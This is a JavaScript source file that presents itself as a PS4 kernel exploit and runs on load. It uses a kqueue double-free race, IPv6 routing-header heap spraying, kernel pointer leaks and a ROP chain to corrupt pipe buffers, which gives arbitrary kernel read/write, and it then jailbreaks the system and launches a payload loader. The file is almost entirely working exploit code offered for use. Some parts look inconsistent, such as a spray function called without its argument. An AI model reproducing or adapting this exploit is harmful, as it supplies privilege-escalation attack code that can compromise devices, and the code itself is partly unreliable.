/**
 * kqueue_exploit.js – PS4 Kernel Exploit (kqueue double‑free UAF)
 *
 * Prerequisites:
 *   - kernel.js  (provides kernel_offset, jailbreak_shared, gadget addresses, etc.)
 *   - binloader.js (provides run_binloader, thrd_create, etc.)
 *   - IPv6 sockets array `ipv6_socks` (created in setup(), or auto‑created here)
 *
 * Usage: include this file after kernel.js and binloader.js.
 *        It automatically runs on load.
 */

// ─── Syscalls ─────────────────────────────────────────────────────
import { fn } from 'types.js';
fn.register(0x16a, "kqueue", [], "bigint");
fn.register(0x29, "dup", ["bigint"], "bigint");
fn.register(0x06, "close", ["bigint"], "bigint");
fn.register(
  0x16b,
  "kevent",
  ["bigint", "bigint", "number", "bigint", "number", "bigint"],
  "bigint"
);

const kqueue = fn.kqueue;
const dup = fn.dup;
const close = fn.close;
const kevent = fn.kevent;

// ─── Constants ────────────────────────────────────────────────────
const KQ_SIZE = 264; // sizeof(struct kqueue)
const SPRAY_COUNT = 400; // kqueue spray count
const IPV6_COUNT = 96; // IPv6 sockets for controlled spray
const RACE_LOOPS = 100000; // loops for close threads (not needed with infinite ROP)

// ─── Global state ─────────────────────────────────────────────────
let ipv6_socks = [];
// Create IPv6 sockets if not already present (e.g., from netctrl setup)
if (typeof ipv6_socks === "undefined" || ipv6_socks.length === 0) {
  for (let i = 0; i < IPV6_COUNT; i++) {
    ipv6_socks.push(socket(28, 1, 0)); // AF_INET6, SOCK_STREAM
  }
}
free_rthdrs(ipv6_socks);

let master_r_pipe_data = [0, 0],
  victim_r_pipe_data = [0, 0];
let master_pipe = [0, 0],
  victim_pipe = [0, 0];

// ─── Helper: spawn infinite close(fd) thread (via ROP) ───────────
function create_race_thread(fd) {
  // x86_64: mov edi, fd ; loop: mov eax,6 ; syscall ; jmp loop
  const code = new Uint8Array([
    0xbf,
    fd & 0xff,
    (fd >> 8) & 0xff,
    (fd >> 16) & 0xff,
    (fd >> 24) & 0xff,
    0xb8,
    6,
    0,
    0,
    0,
    0x0f,
    0x05,
    0xeb,
    0xf7,
  ]);
  const codeBuf = malloc(code.length);
  for (let i = 0; i < code.length; i++) write8(codeBuf.add(i), code[i]);
  const handle = jitshm_create(0, code.length, 0x7);
  const exec = mmap(0, code.length, 0x7, 0x11, handle, 0);
  for (let i = 0; i < code.length; i++) write8(exec.add(i), code[i]);
  const args = malloc(0x68);
  write64(args.add(0x00), exec);
  write64(args.add(0x08), 0);
  write64(args.add(0x10), malloc(0x1000));
  write64(args.add(0x18), 0x1000);
  write64(args.add(0x20), malloc(0x40));
  write64(args.add(0x28), 0x40);
  const tid = malloc(8);
  write64(args.add(0x30), tid);
  write64(args.add(0x38), malloc(8));
  const ret = thr_new(args, 0x68);
  if (!ret.eq(0)) throw new Error("thr_new failed");
  return read64(tid);
}

// ─── Spray a partial fake kqueue (64 bytes) to preserve kq_fdp ──
function spray_fake_kq_prefix(rop_addr) {
  const partial = malloc(0x40); // 64 bytes
  for (let i = 0; i < 0x40; i++) write8(partial.add(i), 0);
  write64(partial.add(0x38), 0x1337); // magic at offset 56

  const rhBuf = malloc(0x40);
  for (let i = 0; i < 0x40; i++) write8(rhBuf.add(i), read8(partial.add(i)));
  const len = ((0x40 >> 3) - 1) & ~1;
  write8(rhBuf.add(0), 0);
  write8(rhBuf.add(1), len);
  write8(rhBuf.add(2), 0);
  write8(rhBuf.add(3), len >> 1);

  free_rthdrs(ipv6_socks);
  for (const sock of ipv6_socks) {
    set_rthdr(sock, rhBuf, 0x40);
  }
}

// ─── Leak kq_fdp and kl_lock from the corrupted kqueue ───────────
function leak_kq_info() {
  const magic = 0x1337;
  const buf = malloc(KQ_SIZE);
  for (let i = 0; i < ipv6_socks.length; i++) {
    get_rthdr(ipv6_socks[i], buf, KQ_SIZE);
    if (read64(buf.add(0x38)).eq(magic)) {
      kq_fdp = read64(buf.add(0x98));
      kl_lock = read64(buf.add(0x60));
      log(`[+] Leaked kq_fdp: ${hex(kq_fdp)}`);
      log(`[+] Leaked kl_lock: ${hex(kl_lock)}`);
      return true;
    }
  }
  return false;
}

// ─── Get pipe structures from our file descriptor table ──────────
function get_pipe_info() {
  const fdt = kq_fdp; // struct filedesc *
  const ofiles = kread64(fdt.add(0)); // fdt_ofiles (array of struct file *)
  // Master pipe pair (already created by setup() or here)
  const m_r_file = kread64(ofiles.add(master_pipe[0] * 8));
  const v_r_file = kread64(ofiles.add(victim_pipe[0] * 8));
  const m_r_pipe = kread64(m_r_file.add(0)); // f_data -> struct pipe
  const v_r_pipe = kread64(v_r_file.add(0));
  master_r_pipe_data = kread64(m_r_pipe.add(0)); // pipe->pipe_buffer (pipebuf *)
  victim_r_pipe_data = kread64(v_r_pipe.add(0));
  log(`[+] master_r_pipe_data: ${hex(master_r_pipe_data)}`);
  log(`[+] victim_r_pipe_data: ${hex(victim_r_pipe_data)}`);
}

// ─── ROP chain for a single 64‑bit write ─────────────────────────
function write_rop(dst, val) {
  const rop = malloc(0x40);
  write64(rop, gadgets.POP_RDI_RET);
  write64(rop.add(8), dst);
  write64(rop.add(16), gadgets.POP_RAX_RET);
  write64(rop.add(24), val);
  write64(rop.add(32), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  write64(rop.add(40), gadgets.RET);
  return rop;
}

// ─── Second UAF: corrupt master pipe buffer → arbitrary R/W ──────
function corrupt_pipe() {
  // 1. New kqueue & dup
  const kq_victim = kqueue();
  const orig = Number(kq_victim.lo);
  const dupFd = Number(dup(kq_victim).lo);
  // 2. Spray kqueues
  const spray_fds = [];
  for (let i = 0; i < SPRAY_COUNT; i++) {
    const f = kqueue();
    if (!f.eq(-1)) spray_fds.push(Number(f.lo));
  }
  // 3. Race
  create_race_thread(orig);
  create_race_thread(dupFd);
  sched_yield();
  sched_yield();
  sched_yield();
  // 4. Spray the write ROP chain via IPV6 (this time full 264 bytes, overwriting everything)
  const target = master_r_pipe_data.add(0x10); // pipebuf.buffer
  const val = victim_r_pipe_data;
  const rop = write_rop(target, val);
  // Spray the ROP chain as the fake kqueue's f_attach gadget (the kernel will JMP RSI to rop)
  const fakeKq = malloc(KQ_SIZE);
  for (let i = 0; i < KQ_SIZE; i++) write8(fakeKq.add(i), 0);
  write64(fakeKq.add(56), fakeKq); // self‑ref
  write64(fakeKq.add(96), kernel.addr.base.add(kernel_offset.JMP_RSI_GADGET)); // f_attach
  const rh = malloc(KQ_SIZE);
  for (let i = 0; i < KQ_SIZE; i++) write8(rh.add(i), read8(fakeKq.add(i)));
  const len = ((KQ_SIZE >> 3) - 1) & ~1;
  write8(rh.add(0), 0);
  write8(rh.add(1), len);
  write8(rh.add(2), 0);
  write8(rh.add(3), len >> 1);
  free_rthdrs(ipv6_socks);
  for (const sock of ipv6_socks) set_rthdr(sock, rh, KQ_SIZE);
  // 5. Trigger kevent with udata = rop
  const kev = malloc(0x20);
  write16(kev.add(0x0a), 0x0001); // EV_ADD
  write16(kev.add(0x08), -1); // filter (unused)
  write64(kev.add(0x18), rop); // udata -> ROP chain
  kevent(new BigInt(dupFd), kev, 1, 0, 0, 0);
  // Now master pipe buffer points to victim pipe data → arbitrary read/write via pipe fds
  log("[+] Pipe corruption done, kernel R/W active");
}

// ─── Quick kernel read/write wrappers (via pipe) ─────────────────
function kwrite(addr, src, n) {
  // Set pipebuf.buffer = addr
  const buf = malloc(0x18);
  write32(buf.add(0x00), 0); // cnt
  write32(buf.add(0x04), 0); // in
  write32(buf.add(0x08), 0); // out
  write32(buf.add(0x0c), 0x4000); // size
  write64(buf.add(0x10), addr); // buffer
  write(new BigInt(master_pipe[1]), buf, 0x18); // write to master pipe → victim pipebuf
  // Now master pipe reads from *addr, writes to *addr
  return write(new BigInt(master_pipe[1]), src, n);
}
function kread(dst, addr, n) {
  const buf = malloc(0x18);
  write32(buf.add(0x00), 0);
  write32(buf.add(0x04), 0);
  write32(buf.add(0x08), 0);
  write32(buf.add(0x0c), 0x4000);
  write64(buf.add(0x10), addr);
  write(new BigInt(master_pipe[1]), buf, 0x18);
  return read(new BigInt(master_pipe[0]), dst, n);
}
function kread64(addr) {
  const tmp = malloc(8);
  kread(tmp, addr, 8);
  return read64(tmp);
}
function kwrite64(addr, val) {
  const tmp = malloc(8);
  write64(tmp, val);
  kwrite(addr, tmp, 8);
}

// ─── Main ─────────────────────────────────────────────────────────
function run_exploit() {
  // 0. Ensure pipes exist (create if not)
  if (master_pipe[0] === 0) {
    const p = malloc(8);
    pipe(p);
    master_pipe[0] = read32(p);
    master_pipe[1] = read32(p.add(4));
    pipe(p);
    victim_pipe[0] = read32(p);
    victim_pipe[1] = read32(p.add(4));
    fcntl(new BigInt(master_pipe[0]), 4, 4);
    fcntl(new BigInt(master_pipe[1]), 4, 4);
    fcntl(new BigInt(victim_pipe[0]), 4, 4);
    fcntl(new BigInt(victim_pipe[1]), 4, 4);
  }

  // 1. First UAF to leak kq_fdp & kl_lock
  log("[*] First UAF: leaking...");
  const kq1 = kqueue();
  const f1 = Number(kq1.lo);
  const f2 = Number(dup(kq1).lo);
  const spray1 = [];
  for (let i = 0; i < SPRAY_COUNT; i++) {
    const f = kqueue();
    if (!f.eq(-1)) spray1.push(Number(f.lo));
  }
  create_race_thread(f1);
  create_race_thread(f2);
  sched_yield();
  sched_yield();
  sched_yield();
  spray_fake_kq_prefix();
  if (!leak_kq_info()) {
    log("[-] Leak failed");
    return;
  }

  // 2. Kernel base
  kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
  log(`[+] Kernel base: ${hex(kernel.addr.base)}`);

  // 3. Get pipe addresses
  get_pipe_info();

  // 4. Second UAF to corrupt master pipe
  log("[*] Second UAF: corrupting pipe...");
  corrupt_pipe();

  // 5. Test R/W
  const test = kread64(master_r_pipe_data);
  log(`[+] Test read: ${hex(test)}`);

  // 6. Install kernel read/write into global kernel object
  kernel.read_buffer = function (addr, len) {
    const buf = malloc(len);
    kread(buf, addr, len);
    const out = new Uint8Array(len);
    for (let i = 0; i < len; i++) out[i] = read8(buf.add(i));
    return out;
  };
  kernel.write_buffer = function (addr, data) {
    const buf = malloc(data.length);
    for (let i = 0; i < data.length; i++) write8(buf.add(i), data[i]);
    kwrite(addr, buf, data.length);
  };

  // 7. Jailbreak
  log("[*] Running jailbreak...");
  kernel.addr.allproc = find_allproc(); // from kernel.js
  jailbreak_shared(FW_VERSION);
  log("[+] Jailbreak complete, launching payload...");
  run_binloader();
}

// Auto‑start
run_exploit();
